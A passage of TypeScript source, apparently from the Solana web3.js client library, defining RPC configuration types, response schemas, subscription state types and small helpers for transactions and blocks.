'./programs/address-lookup-table/state';\nimport assert from './utils/assert';\nimport {sleep} from './utils/sleep';\nimport {toBuffer} from './utils/to-buffer';\nimport {\n  TransactionExpiredBlockheightExceededError,\n  TransactionExpiredNonceInvalidError,\n  TransactionExpiredTimeoutError,\n} from './transaction/expiry-custom-errors';\nimport {makeWebsocketUrl} from './utils/makeWebsocketUrl';\nimport type {Blockhash} from './blockhash';\nimport type {FeeCalculator} from './fee-calculator';\nimport type {TransactionSignature} from './transaction';\nimport type {CompiledInstruction} from './message';\n\nconst PublicKeyFromString = coerce(\n  instance(PublicKey),\n  string(),\n  value => new PublicKey(value),\n);\n\nconst RawAccountDataResult = tuple([string(), literal('base64')]);\n\nconst BufferFromRawAccountData = coerce(\n  instance(Buffer),\n  RawAccountDataResult,\n  value => Buffer.from(value[0], 'base64'),\n);\n\n/**\n * Attempt to use a recent blockhash for up to 30 seconds\n * @internal\n */\nexport const BLOCKHASH_CACHE_TIMEOUT_MS = 30 * 1000;\n\n/**\n * HACK.\n * Copied from rpc-websockets/dist/lib/client.\n * Otherwise, `yarn build` fails with:\n * https://gist.github.com/steveluscher/c057eca81d479ef705cdb53162f9971d\n */\ninterface IWSRequestParams {\n  [x: string]: any;\n  [x: number]: any;\n}\n\ntype ClientSubscriptionId = number;\n/** @internal */ type ServerSubscriptionId = number;\n/** @internal */ type SubscriptionConfigHash = string;\n/** @internal */ type SubscriptionDisposeFn = () => Promise<void>;\n/** @internal */ type SubscriptionStateChangeCallback = (\n  nextState: StatefulSubscription['state'],\n) => void;\n/** @internal */ type SubscriptionStateChangeDisposeFn = () => void;\n/**\n * @internal\n * Every subscription contains the args used to open the subscription with\n * the server, and a list of callers interested in notifications.\n */\ntype BaseSubscription<TMethod = SubscriptionConfig['method']> = Readonly<{\n  args: IWSRequestParams;\n  callbacks: Set<Extract<SubscriptionConfig, {method: TMethod}>['callback']>;\n}>;\n/**\n * @internal\n * A subscription may be in various states of connectedness. Only when it is\n * fully connected will it have a server subscription id associated with it.\n * This id can be returned to the server to unsubscribe the client entirely.\n */\ntype StatefulSubscription = Readonly<\n  // New subscriptions that have not yet been\n  // sent to the server start in this state.\n  | {\n      state: 'pending';\n    }\n  // These subscriptions have been sent to the server\n  // and are waiting for the server to acknowledge them.\n  | {\n      state: 'subscribing';\n    }\n  // These subscriptions have been acknowledged by the\n  // server and have been assigned server subscription ids.\n  | {\n      serverSubscriptionId: ServerSubscriptionId;\n      state: 'subscribed';\n    }\n  // These subscriptions are intended to be torn down and\n  // are waiting on an acknowledgement from the server.\n  | {\n      serverSubscriptionId: ServerSubscriptionId;\n      state: 'unsubscribing';\n    }\n  // The request to tear down these subscriptions has been\n  // acknowledged by the server. The `serverSubscriptionId`\n  // is the id of the now-dead subscription.\n  | {\n      serverSubscriptionId: ServerSubscriptionId;\n      state: 'unsubscribed';\n    }\n>;\n/**\n * A type that encapsulates a subscription's RPC method\n * names and notification (callback) signature.\n */\ntype SubscriptionConfig = Readonly<\n  | {\n      callback: AccountChangeCallback;\n      method: 'accountSubscribe';\n      unsubscribeMethod: 'accountUnsubscribe';\n    }\n  | {\n      callback: LogsCallback;\n      method: 'logsSubscribe';\n      unsubscribeMethod: 'logsUnsubscribe';\n    }\n  | {\n      callback: ProgramAccountChangeCallback;\n      method: 'programSubscribe';\n      unsubscribeMethod: 'programUnsubscribe';\n    }\n  | {\n      callback: RootChangeCallback;\n      method: 'rootSubscribe';\n      unsubscribeMethod: 'rootUnsubscribe';\n    }\n  | {\n      callback: SignatureSubscriptionCallback;\n      method: 'signatureSubscribe';\n      unsubscribeMethod: 'signatureUnsubscribe';\n    }\n  | {\n      callback: SlotChangeCallback;\n      method: 'slotSubscribe';\n      unsubscribeMethod: 'slotUnsubscribe';\n    }\n  | {\n      callback: SlotUpdateCallback;\n      method: 'slotsUpdatesSubscribe';\n      unsubscribeMethod: 'slotsUpdatesUnsubscribe';\n    }\n>;\n/**\n * @internal\n * Utility type that keeps tagged unions intact while omitting properties.\n */\ntype DistributiveOmit<T, K extends PropertyKey> = T extends unknown\n  ? Omit<T, K>\n  : never;\n/**\n * @internal\n * This type represents a single subscribable 'topic.' It's made up of:\n *\n * - The args used to open the subscription with the server,\n * - The state of the subscription, in terms of its connectedness, and\n * - The set of callbacks to call when the server publishes notifications\n *\n * This record gets indexed by `SubscriptionConfigHash` and is used to\n * set up subscriptions, fan out notifications, and track subscription state.\n */\ntype Subscription = BaseSubscription &\n  StatefulSubscription &\n  DistributiveOmit<SubscriptionConfig, 'callback'>;\n\ntype RpcRequest = (methodName: string, args: Array<any>) => Promise<any>;\n\ntype RpcBatchRequest = (requests: RpcParams[]) => Promise<any[]>;\n\n/**\n * @internal\n */\nexport type RpcParams = {\n  methodName: string;\n  args: Array<any>;\n};\n\nexport type TokenAccountsFilter =\n  | {\n      mint: PublicKey;\n    }\n  | {\n      programId: PublicKey;\n    };\n\n/**\n * Extra contextual information for RPC responses\n */\nexport type Context = {\n  slot: number;\n};\n\n/**\n * Options for sending transactions\n */\nexport type SendOptions = {\n  /** disable transaction verification step */\n  skipPreflight?: boolean;\n  /** preflight commitment level */\n  preflightCommitment?: Commitment;\n  /** Maximum number of times for the RPC node to retry sending the transaction to the leader. */\n  maxRetries?: number;\n  /** The minimum slot that the request can be evaluated at */\n  minContextSlot?: number;\n};\n\n/**\n * Options for confirming transactions\n */\nexport type ConfirmOptions = {\n  /** disable transaction verification step */\n  skipPreflight?: boolean;\n  /** desired commitment level */\n  commitment?: Commitment;\n  /** preflight commitment level */\n  preflightCommitment?: Commitment;\n  /** Maximum number of times for the RPC node to retry sending the transaction to the leader. */\n  maxRetries?: number;\n  /** The minimum slot that the request can be evaluated at */\n  minContextSlot?: number;\n};\n\n/**\n * Options for getConfirmedSignaturesForAddress2\n */\nexport type ConfirmedSignaturesForAddress2Options = {\n  /**\n   * Start searching backwards from this transaction signature.\n   * @remarks If not provided the search starts from the highest max confirmed block.\n   */\n  before?: TransactionSignature;\n  /** Search until this transaction signature is reached, if found before `limit`. */\n  until?: TransactionSignature;\n  /** Maximum transaction signatures to return (between 1 and 1,000, default: 1,000). */\n  limit?: number;\n};\n\n/**\n * Options for getSignaturesForAddress\n */\nexport type SignaturesForAddressOptions = {\n  /**\n   * Start searching backwards from this transaction signature.\n   * @remarks If not provided the search starts from the highest max confirmed block.\n   */\n  before?: TransactionSignature;\n  /** Search until this transaction signature is reached, if found before `limit`. */\n  until?: TransactionSignature;\n  /** Maximum transaction signatures to return (between 1 and 1,000, default: 1,000). */\n  limit?: number;\n  /** The minimum slot that the request can be evaluated at */\n  minContextSlot?: number;\n};\n\n/**\n * RPC Response with extra contextual information\n */\nexport type RpcResponseAndContext<T> = {\n  /** response context */\n  context: Context;\n  /** response value */\n  value: T;\n};\n\nexport type BlockhashWithExpiryBlockHeight = Readonly<{\n  blockhash: Blockhash;\n  lastValidBlockHeight: number;\n}>;\n\n/**\n * A strategy for confirming transactions that uses the last valid\n * block height for a given blockhash to check for transaction expiration.\n */\nexport type BlockheightBasedTransactionConfirmationStrategy =\n  BaseTransactionConfirmationStrategy & BlockhashWithExpiryBlockHeight;\n\n/**\n * A strategy for confirming durable nonce transactions.\n */\nexport type DurableNonceTransactionConfirmationStrategy =\n  BaseTransactionConfirmationStrategy & {\n    /**\n     * The lowest slot at which to fetch the nonce value from the\n     * nonce account. This should be no lower than the slot at\n     * which the last-known value of the nonce was fetched.\n     */\n    minContextSlot: number;\n    /**\n     * The account where the current value of the nonce is stored.\n     */\n    nonceAccountPubkey: PublicKey;\n    /**\n     * The nonce value that was used to sign the transaction\n     * for which confirmation is being sought.\n     */\n    nonceValue: DurableNonce;\n  };\n\n/**\n * Properties shared by all transaction confirmation strategies\n */\nexport type BaseTransactionConfirmationStrategy = Readonly<{\n  /** A signal that, when aborted, cancels any outstanding transaction confirmation operations */\n  abortSignal?: AbortSignal;\n  signature: TransactionSignature;\n}>;\n\n/**\n * This type represents all transaction confirmation strategies\n */\nexport type TransactionConfirmationStrategy =\n  | BlockheightBasedTransactionConfirmationStrategy\n  | DurableNonceTransactionConfirmationStrategy;\n\n/* @internal */\nfunction assertEndpointUrl(putativeUrl: string) {\n  if (/^https?:/.test(putativeUrl) === false) {\n    throw new TypeError('Endpoint URL must start with `http:` or `https:`.');\n  }\n  return putativeUrl;\n}\n\n/** @internal */\nfunction extractCommitmentFromConfig<TConfig>(\n  commitmentOrConfig?: Commitment | ({commitment?: Commitment} & TConfig),\n) {\n  let commitment: Commitment | undefined;\n  let config: Omit<TConfig, 'commitment'> | undefined;\n  if (typeof commitmentOrConfig === 'string') {\n    commitment = commitmentOrConfig;\n  } else if (commitmentOrConfig) {\n    const {commitment: specifiedCommitment, ...specifiedConfig} =\n      commitmentOrConfig;\n    commitment = specifiedCommitment;\n    config = specifiedConfig;\n  }\n  return {commitment, config};\n}\n\n/**\n * @internal\n */\nfunction applyDefaultMemcmpEncodingToFilters(\n  filters: GetProgramAccountsFilter[],\n): GetProgramAccountsFilter[] {\n  return filters.map(filter =>\n    'memcmp' in filter\n      ? {\n          ...filter,\n          memcmp: {\n            ...filter.memcmp,\n            encoding: filter.memcmp.encoding ?? 'base58',\n          },\n        }\n      : filter,\n  );\n}\n\n/**\n * @internal\n */\nfunction createRpcResult<T, U>(result: Struct<T, U>) {\n  return union([\n    pick({\n      jsonrpc: literal('2.0'),\n      id: string(),\n      result,\n    }),\n    pick({\n      jsonrpc: literal('2.0'),\n      id: string(),\n      error: pick({\n        code: unknown(),\n        message: string(),\n        data: optional(any()),\n      }),\n    }),\n  ]);\n}\n\nconst UnknownRpcResult = createRpcResult(unknown());\n\n/**\n * @internal\n */\nfunction jsonRpcResult<T, U>(schema: Struct<T, U>) {\n  return coerce(createRpcResult(schema), UnknownRpcResult, value => {\n    if ('error' in value) {\n      return value;\n    } else {\n      return {\n        ...value,\n        result: create(value.result, schema),\n      };\n    }\n  });\n}\n\n/**\n * @internal\n */\nfunction jsonRpcResultAndContext<T, U>(value: Struct<T, U>) {\n  return jsonRpcResult(\n    pick({\n      context: pick({\n        slot: number(),\n      }),\n      value,\n    }),\n  );\n}\n\n/**\n * @internal\n */\nfunction notificationResultAndContext<T, U>(value: Struct<T, U>) {\n  return pick({\n    context: pick({\n      slot: number(),\n    }),\n    value,\n  });\n}\n\n/**\n * @internal\n */\nfunction versionedMessageFromResponse(\n  version: TransactionVersion | undefined,\n  response: MessageResponse,\n): VersionedMessage {\n  if (version === 0) {\n    return new MessageV0({\n      header: response.header,\n      staticAccountKeys: response.accountKeys.map(\n        accountKey => new PublicKey(accountKey),\n      ),\n      recentBlockhash: response.recentBlockhash,\n      compiledInstructions: response.instructions.map(ix => ({\n        programIdIndex: ix.programIdIndex,\n        accountKeyIndexes: ix.accounts,\n        data: bs58.decode(ix.data),\n      })),\n      addressTableLookups: response.addressTableLookups!,\n    });\n  } else {\n    return new Message(response);\n  }\n}\n\n/**\n * The level of commitment desired when querying state\n * <pre>\n *   'processed': Query the most recent block which has reached 1 confirmation by the connected node\n *   'confirmed': Query the most recent block which has reached 1 confirmation by the cluster\n *   'finalized': Query the most recent block which has been finalized by the cluster\n * </pre>\n */\nexport type Commitment =\n  | 'processed'\n  | 'confirmed'\n  | 'finalized'\n  | 'recent' // Deprecated as of v1.5.5\n  | 'single' // Deprecated as of v1.5.5\n  | 'singleGossip' // Deprecated as of v1.5.5\n  | 'root' // Deprecated as of v1.5.5\n  | 'max'; // Deprecated as of v1.5.5\n\n/**\n * A subset of Commitment levels, which are at least optimistically confirmed\n * <pre>\n *   'confirmed': Query the most recent block which has reached 1 confirmation by the cluster\n *   'finalized': Query the most recent block which has been finalized by the cluster\n * </pre>\n */\nexport type Finality = 'confirmed' | 'finalized';\n\n/**\n * Filter for largest accounts query\n * <pre>\n *   'circulating':    Return the largest accounts that are part of the circulating supply\n *   'nonCirculating': Return the largest accounts that are not part of the circulating supply\n * </pre>\n */\nexport type LargestAccountsFilter = 'circulating' | 'nonCirculating';\n\n/**\n * Configuration object for changing `getAccountInfo` query behavior\n */\nexport type GetAccountInfoConfig = {\n  /** The level of commitment desired */\n  commitment?: Commitment;\n  /** The minimum slot that the request can be evaluated at */\n  minContextSlot?: number;\n  /** Optional data slice to limit the returned account data */\n  dataSlice?: DataSlice;\n};\n\n/**\n * Configuration object for changing `getBalance` query behavior\n */\nexport type GetBalanceConfig = {\n  /** The level of commitment desired */\n  commitment?: Commitment;\n  /** The minimum slot that the request can be evaluated at */\n  minContextSlot?: number;\n};\n\n/**\n * Configuration object for changing `getBlock` query behavior\n */\nexport type GetBlockConfig = {\n  /** The level of finality desired */\n  commitment?: Finality;\n  /**\n   * Whether to populate the rewards array. If parameter not provided, the default includes rewards.\n   */\n  rewards?: boolean;\n  /**\n   * Level of transaction detail to return, either \"full\", \"accounts\", \"signatures\", or \"none\". If\n   * parameter not provided, the default detail level is \"full\". If \"accounts\" are requested,\n   * transaction details only include signatures and an annotated list of accounts in each\n   * transaction. Transaction metadata is limited to only: fee, err, pre_balances, post_balances,\n   * pre_token_balances, and post_token_balances.\n   */\n  transactionDetails?: 'accounts' | 'full' | 'none' | 'signatures';\n};\n\n/**\n * Configuration object for changing `getBlock` query behavior\n */\nexport type GetVersionedBlockConfig = {\n  /** The level of finality desired */\n  commitment?: Finality;\n  /** The max transaction version to return in responses. If the requested transaction is a higher version, an error will be returned */\n  maxSupportedTransactionVersion?: number;\n  /**\n   * Whether to populate the rewards array. If parameter not provided, the default includes rewards.\n   */\n  rewards?: boolean;\n  /**\n   * Level of transaction detail to return, either \"full\", \"accounts\", \"signatures\", or \"none\". If\n   * parameter not provided, the default detail level is \"full\". If \"accounts\" are requested,\n   * transaction details only include signatures and an annotated list of accounts in each\n   * transaction. Transaction metadata is limited to only: fee, err, pre_balances, post_balances,\n   * pre_token_balances, and post_token_balances.\n   */\n  transactionDetails?: 'accounts' | 'full' | 'none' | 'signatures';\n};\n\n/**\n * Configuration object for changing `getStakeMinimumDelegation` query behavior\n */\nexport type GetStakeMinimumDelegationConfig = {\n  /** The level of commitment desired */\n  commitment?: Commitment;\n};\n\n/**\n * Configuration object for changing `getBlockHeight` query behavior\n */\nexport type GetBlockHeightConfig = {\n  /** The level of commitment desired */\n  commitment?: Commitment;\n  /** The minimum slot that the request can be evaluated at */\n  minContextSlot?: number;\n};\n\n/**\n * Configuration object for changing `getEpochInfo` query behavior\n */\nexport type GetEpochInfoConfig = {\n  /** The level of commitment desired */\n  commitment?: Commitment;\n  /** The minimum slot that the request can be evaluated at */\n  minContextSlot?: number;\n};\n\n/**\n * Configuration object for changing `getInflationReward` query behavior\n */\nexport type GetInflationRewardConfig = {\n  /** The level of commitment desired */\n  commitment?: Commitment;\n  /** An epoch for which the reward occurs. If omitted, the previous epoch will be used */\n  epoch?: number;\n  /** The minimum slot that the request can be evaluated at */\n  minContextSlot?: number;\n};\n\n/**\n * Configuration object for changing `getLatestBlockhash` query behavior\n */\nexport type GetLatestBlockhashConfig = {\n  /** The level of commitment desired */\n  commitment?: Commitment;\n  /** The minimum slot that the request can be evaluated at */\n  minContextSlot?: number;\n};\n\n/**\n * Configuration object for changing `isBlockhashValid` query behavior\n */\nexport type IsBlockhashValidConfig = {\n  /** The level of commitment desired */\n  commitment?: Commitment;\n  /** The minimum slot that the request can be evaluated at */\n  minContextSlot?: number;\n};\n\n/**\n * Configuration object for changing `getSlot` query behavior\n */\nexport type GetSlotConfig = {\n  /** The level of commitment desired */\n  commitment?: Commitment;\n  /** The minimum slot that the request can be evaluated at */\n  minContextSlot?: number;\n};\n\n/**\n * Configuration object for changing `getSlotLeader` query behavior\n */\nexport type GetSlotLeaderConfig = {\n  /** The level of commitment desired */\n  commitment?: Commitment;\n  /** The minimum slot that the request can be evaluated at */\n  minContextSlot?: number;\n};\n\n/**\n * Configuration object for changing `getTransaction` query behavior\n */\nexport type GetTransactionConfig = {\n  /** The level of finality desired */\n  commitment?: Finality;\n};\n\n/**\n * Configuration object for changing `getTransaction` query behavior\n */\nexport type GetVersionedTransactionConfig = {\n  /** The level of finality desired */\n  commitment?: Finality;\n  /** The max transaction version to return in responses. If the requested transaction is a higher version, an error will be returned */\n  maxSupportedTransactionVersion?: number;\n};\n\n/**\n * Configuration object for changing `getLargestAccounts` query behavior\n */\nexport type GetLargestAccountsConfig = {\n  /** The level of commitment desired */\n  commitment?: Commitment;\n  /** Filter largest accounts by whether they are part of the circulating supply */\n  filter?: LargestAccountsFilter;\n};\n\n/**\n * Configuration object for changing `getSupply` request behavior\n */\nexport type GetSupplyConfig = {\n  /** The level of commitment desired */\n  commitment?: Commitment;\n  /** Exclude non circulating accounts list from response */\n  excludeNonCirculatingAccountsList?: boolean;\n};\n\n/**\n * Configuration object for changing query behavior\n */\nexport type SignatureStatusConfig = {\n  /** enable searching status history, not needed for recent transactions */\n  searchTransactionHistory: boolean;\n};\n\n/**\n * Information describing a cluster node\n */\nexport type ContactInfo = {\n  /** Identity public key of the node */\n  pubkey: string;\n  /** Gossip network address for the node */\n  gossip: string | null;\n  /** TPU network address for the node (null if not available) */\n  tpu: string | null;\n  /** JSON RPC network address for the node (null if not available) */\n  rpc: string | null;\n  /** Software version of the node (null if not available) */\n  version: string | null;\n};\n\n/**\n * Information describing a vote account\n */\nexport type VoteAccountInfo = {\n  /** Public key of the vote account */\n  votePubkey: string;\n  /** Identity public key of the node voting with this account */\n  nodePubkey: string;\n  /** The stake, in lamports, delegated to this vote account and activated */\n  activatedStake: number;\n  /** Whether the vote account is staked for this epoch */\n  epochVoteAccount: boolean;\n  /** Recent epoch voting credit history for this voter */\n  epochCredits: Array<[number, number, number]>;\n  /** A percentage (0-100) of rewards payout owed to the voter */\n  commission: number;\n  /** Most recent slot voted on by this vote account */\n  lastVote: number;\n};\n\n/**\n * A collection of cluster vote accounts\n */\nexport type VoteAccountStatus = {\n  /** Active vote accounts */\n  current: Array<VoteAccountInfo>;\n  /** Inactive vote accounts */\n  delinquent: Array<VoteAccountInfo>;\n};\n\n/**\n * Network Inflation\n * (see https://docs.solana.com/implemented-proposals/ed_overview)\n */\nexport type InflationGovernor = {\n  foundation: number;\n  foundationTerm: number;\n  initial: number;\n  taper: number;\n  terminal: number;\n};\n\nconst GetInflationGovernorResult = pick({\n  foundation: number(),\n  foundationTerm: number(),\n  initial: number(),\n  taper: number(),\n  terminal: number(),\n});\n\n/**\n * The inflation reward for an epoch\n */\nexport type InflationReward = {\n  /** epoch for which the reward occurs */\n  epoch: number;\n  /** the slot in which the rewards are effective */\n  effectiveSlot: number;\n  /** reward amount in lamports */\n  amount: number;\n  /** post balance of the account in lamports */\n  postBalance: number;\n  /** vote account commission when the reward was credited */\n  commission?: number | null;\n};\n\n/**\n * Expected JSON RPC response for the \"getInflationReward\" message\n */\nconst GetInflationRewardResult = jsonRpcResult(\n  array(\n    nullable(\n      pick({\n        epoch: number(),\n        effectiveSlot: number(),\n        amount: number(),\n        postBalance: number(),\n        commission: optional(nullable(number())),\n      }),\n    ),\n  ),\n);\n\nexport type RecentPrioritizationFees = {\n  /** slot in which the fee was observed */\n  slot: number;\n  /** the per-compute-unit fee paid by at least one successfully landed transaction, specified in increments of 0.000001 lamports*/\n  prioritizationFee: number;\n};\n\n/**\n * Configuration object for changing `getRecentPrioritizationFees` query behavior\n */\nexport type GetRecentPrioritizationFeesConfig = {\n  /**\n   * If this parameter is provided, the response will reflect a fee to land a transaction locking\n   * all of the provided accounts as writable.\n   */\n  lockedWritableAccounts?: PublicKey[];\n};\n\n/**\n * Expected JSON RPC response for the \"getRecentPrioritizationFees\" message\n */\nconst GetRecentPrioritizationFeesResult = array(\n  pick({\n    slot: number(),\n    prioritizationFee: number(),\n  }),\n);\n\nexport type InflationRate = {\n  /** total inflation */\n  total: number;\n  /** inflation allocated to validators */\n  validator: number;\n  /** inflation allocated to the foundation */\n  foundation: number;\n  /** epoch for which these values are valid */\n  epoch: number;\n};\n\n/**\n * Expected JSON RPC response for the \"getInflationRate\" message\n */\nconst GetInflationRateResult = pick({\n  total: number(),\n  validator: number(),\n  foundation: number(),\n  epoch: number(),\n});\n\n/**\n * Information about the current epoch\n */\nexport type EpochInfo = {\n  epoch: number;\n  slotIndex: number;\n  slotsInEpoch: number;\n  absoluteSlot: number;\n  blockHeight?: number;\n  transactionCount?: number;\n};\n\nconst GetEpochInfoResult = pick({\n  epoch: number(),\n  slotIndex: number(),\n  slotsInEpoch: number(),\n  absoluteSlot: number(),\n  blockHeight: optional(number()),\n  transactionCount: optional(number()),\n});\n\nconst GetEpochScheduleResult = pick({\n  slotsPerEpoch: number(),\n  leaderScheduleSlotOffset: number(),\n  warmup: boolean(),\n  firstNormalEpoch: number(),\n  firstNormalSlot: number(),\n});\n\n/**\n * Leader schedule\n * (see https://docs.solana.com/terminology#leader-schedule)\n */\nexport type LeaderSchedule = {\n  [address: string]: number[];\n};\n\nconst GetLeaderScheduleResult = record(string(), array(number()));\n\n/**\n * Transaction error or null\n */\nconst TransactionErrorResult = nullable(union([pick({}), string()]));\n\n/**\n * Signature status for a transaction\n */\nconst SignatureStatusResult = pick({\n  err: TransactionErrorResult,\n});\n\n/**\n * Transaction signature received notification\n */\nconst SignatureReceivedResult = literal('receivedSignature');\n\n/**\n * Version info for a node\n */\nexport type Version = {\n  /** Version of solana-core */\n  'solana-core': string;\n  'feature-set'?: number;\n};\n\nconst VersionResult = pick({\n  'solana-core': string(),\n  'feature-set': optional(number()),\n});\n\nexport type SimulatedTransactionAccountInfo = {\n  /** `true` if this account's data contains a loaded program */\n  executable: boolean;\n  /** Identifier of the program that owns the account */\n  owner: string;\n  /** Number of lamports assigned to the account */\n  lamports: number;\n  /** Optional data assigned to the account */\n  data: string[];\n  /** Optional rent epoch info for account */\n  rentEpoch?: number;\n};\n\nexport type TransactionReturnDataEncoding = 'base64';\n\nexport type TransactionReturnData = {\n  programId: string;\n  data: [string, TransactionReturnDataEncoding];\n};\n\nexport type SimulateTransactionConfig = {\n  /** Optional parameter used to enable signature verification before simulation */\n  sigVerify?: boolean;\n  /** Optional parameter used to replace the simulated transaction's recent blockhash with the latest blockhash */\n  replaceRecentBlockhash?: boolean;\n  /** Optional parameter used to set the commitment level when selecting the latest block */\n  commitment?: Commitment;\n  /** Optional parameter used to specify a list of base58-encoded account addresses to return post simulation state for */\n  accounts?: {\n    /** The encoding of the returned account's data */\n    encoding: 'base64';\n    addresses: string[];\n  };\n  /** Optional parameter used to specify the minimum block slot that can be used for simulation */\n  minContextSlot?: number;\n  /** Optional parameter used to include inner instructions in the simulation */\n  innerInstructions?: boolean;\n};\n\nexport type SimulatedTransactionResponse = {\n  err: TransactionError | string | null;\n  logs: Array<string> | null;\n  accounts?: (SimulatedTransactionAccountInfo | null)[] | null;\n  unitsConsumed?: number;\n  returnData?: TransactionReturnData | null;\n  innerInstructions?: ParsedInnerInstruction[] | null;\n};\nconst ParsedInstructionStruct = pick({\n  program: string(),\n  programId: PublicKeyFromString,\n  parsed: unknown(),\n});\n\nconst PartiallyDecodedInstructionStruct = pick({\n  programId: PublicKeyFromString,\n  accounts: array(PublicKeyFromString),\n  data: string(),\n});\n\nconst SimulatedTransactionResponseStruct = jsonRpcResultAndContext(\n  pick({\n    err: nullable(union([pick({}), string()])),\n    logs: nullable(array(string())),\n    accounts: optional(\n      nullable(\n        array(\n          nullable(\n            pick({\n              executable: boolean(),\n              owner: string(),\n              lamports: number(),\n              data: array(string()),\n              rentEpoch: optional(number()),\n            }),\n          ),\n        ),\n      ),\n    ),\n    unitsConsumed: optional(number()),\n    returnData: optional(\n      nullable(\n        pick({\n          programId: string(),\n          data: tuple([string(), literal('base64')]),\n        }),\n      ),\n    ),\n    innerInstructions: optional(\n      nullable(\n        array(\n          pick({\n            index: number(),\n            instructions: array(\n              union([\n                ParsedInstructionStruct,\n                PartiallyDecodedInstructionStruct,\n              ]),\n            ),\n          }),\n        ),\n      ),\n    ),\n  }),\n);\n\nexport type ParsedInnerInstruction = {\n  index: number;\n  instructions: (ParsedInstruction | PartiallyDecodedInstruction)[];\n};\n\nexport type TokenBalance = {\n  accountIndex: number;\n  mint: string;\n  owner?: string;\n  programId?: string;\n  uiTokenAmount: TokenAmount;\n};\n\n/**\n * Metadata for a parsed confirmed transaction on the ledger\n *\n * @deprecated Deprecated since RPC v1.8.0. Please use {@link ParsedTransactionMeta} instead.\n */\nexport type ParsedConfirmedTransactionMeta = ParsedTransactionMeta;\n\n/**\n * Collection of addresses loaded by a transaction using address table lookups\n */\nexport type LoadedAddresses = {\n  writable: Array<PublicKey>;\n  readonly: Array<PublicKey>;\n};\n\n/**\n * Metadata for a parsed transaction on the ledger\n */\nexport type ParsedTransactionMeta = {\n  /** The fee charged for processing the transaction */\n  fee: number;\n  /** An array of cross program invoked parsed instructions */\n  innerInstructions?: ParsedInnerInstruction[] | null;\n  /** The balances of the transaction accounts before processing */\n  preBalances: Array<number>;\n  /** The balances of the transaction accounts after processing */\n  postBalances: Array<number>;\n  /** An array of program log messages emitted during a transaction */\n  logMessages?: Array<string> | null;\n  /** The token balances of the transaction accounts before processing */\n  preTokenBalances?: Array<TokenBalance> | null;\n  /** The token balances of the transaction accounts after processing */\n  postTokenBalances?: Array<TokenBalance> | null;\n  /** The error result of transaction processing */\n  err: TransactionError | null;\n  /** The collection of addresses loaded using address lookup tables */\n  loadedAddresses?: LoadedAddresses;\n  /** The compute units consumed after processing the transaction */\n  computeUnitsConsumed?: number;\n};\n\nexport type CompiledInnerInstruction = {\n  index: number;\n  instructions: CompiledInstruction[];\n};\n\n/**\n * Metadata for a confirmed transaction on the ledger\n */\nexport type ConfirmedTransactionMeta = {\n  /** The fee charged for processing the transaction */\n  fee: number;\n  /** An array of cross program invoked instructions */\n  innerInstructions?: CompiledInnerInstruction[] | null;\n  /** The balances of the transaction accounts before processing */\n  preBalances: Array<number>;\n  /** The balances of the transaction accounts after processing */\n  postBalances: Array<number>;\n  /** An array of program log messages emitted during a transaction */\n  logMessages?: Array<string> | null;\n  /** The token balances of the transaction accounts before processing */\n  preTokenBalances?: Array<TokenBalance> | null;\n  /** The token balances of the transaction accounts after processing */\n  postTokenBalances?: Array<TokenBalance> | null;\n  /** The error result of transaction processing */\n  err: TransactionError | null;\n  /** The collection of addresses loaded using address lookup tables */\n  loadedAddresses?: LoadedAddresses;\n  /** The compute units consumed after processing the transaction */\n  computeUnitsConsumed?: number;\n};\n\n/**\n * A processed transaction from the RPC API\n */\nexport type TransactionResponse = {\n  /** The slot during which the transaction was processed */\n  slot: number;\n  /** The transaction */\n  transaction: {\n    /** The transaction message */\n    message: Message;\n    /** The transaction signatures */\n    signatures: string[];\n  };\n  /** Metadata produced from the transaction */\n  meta: ConfirmedTransactionMeta | null;\n  /** The unix timestamp of when the transaction was processed */\n  blockTime?: number | null;\n};\n\n/**\n * A processed transaction from the RPC API\n */\nexport type VersionedTransactionResponse = {\n  /** The slot during which the transaction was processed */\n  slot: number;\n  /** The transaction */\n  transaction: {\n    /** The transaction message */\n    message: VersionedMessage;\n    /** The transaction signatures */\n    signatures: string[];\n  };\n  /** Metadata produced from the transaction */\n  meta: ConfirmedTransactionMeta | null;\n  /** The unix timestamp of when the transaction was processed */\n  blockTime?: number | null;\n  /** The transaction version */\n  version?: TransactionVersion;\n};\n\n/**\n * A processed transaction message from the RPC API\n */\ntype MessageResponse = {\n  accountKeys: string[];\n  header: MessageHeader;\n  instructions: CompiledInstruction[];\n  recentBlockhash: string;\n  addressTableLookups?: ParsedAddressTableLookup[];\n};\n\n/**\n * A confirmed transaction on the ledger\n *\n * @deprecated Deprecated since RPC v1.8.0.\n */\nexport type ConfirmedTransaction = {\n  /** The slot during which the transaction was processed */\n  slot: number;\n  /** The details of the transaction */\n  transaction: Transaction;\n  /** Metadata produced from the transaction */\n  meta: ConfirmedTransactionMeta | null;\n  /** The unix timestamp of when the transaction was processed */\n  blockTime?: number | null;\n};\n\n/**\n * A partially decoded transaction instruction\n */\nexport type PartiallyDecodedInstruction = {\n  /** Program id called by this instruction */\n  programId: PublicKey;\n  /** Public keys of accounts passed to this instruction */\n  accounts: Array<PublicKey>;\n  /** Raw base-58 instruction data */\n  data: string;\n};\n\n/**\n * A parsed transaction message account\n */\nexport type ParsedMessageAccount = {\n  /** Public key of the account */\n  pubkey: PublicKey;\n  /** Indicates if the account signed the transaction */\n  signer: boolean;\n  /** Indicates if the account is writable for this transaction */\n  writable: boolean;\n  /** Indicates if the account key came from the transaction or a lookup table */\n  source?: 'transaction' | 'lookupTable';\n};\n\n/**\n * A parsed transaction instruction\n */\nexport type ParsedInstruction = {\n  /** Name of the program for this instruction */\n  program: string;\n  /** ID of the program for this instruction */\n  programId: PublicKey;\n  /** Parsed instruction info */\n  parsed: any;\n};\n\n/**\n * A parsed address table lookup\n */\nexport type ParsedAddressTableLookup = {\n  /** Address lookup table account key */\n  accountKey: PublicKey;\n  /** Parsed instruction info */\n  writableIndexes: number[];\n  /** Parsed instruction info */\n  readonlyIndexes: number[];\n};\n\n/**\n * A parsed transaction message\n */\nexport type ParsedMessage = {\n  /** Accounts used in the instructions */\n  accountKeys: ParsedMessageAccount[];\n  /** The atomically executed instructions for the transaction */\n  instructions: (ParsedInstruction | PartiallyDecodedInstruction)[];\n  /** Recent blockhash */\n  recentBlockhash: string;\n  /** Address table lookups used to load additional accounts */\n  addressTableLookups?: ParsedAddressTableLookup[] | null;\n};\n\n/**\n * A parsed transaction\n */\nexport type ParsedTransaction = {\n  /** Signatures for the transaction */\n  signatures: Array<string>;\n  /** Message of the transaction */\n  message: ParsedMessage;\n};\n\n/**\n * A parsed and confirmed transaction on the ledger\n *\n * @deprecated Deprecated since RPC v1.8.0. Please use {@link 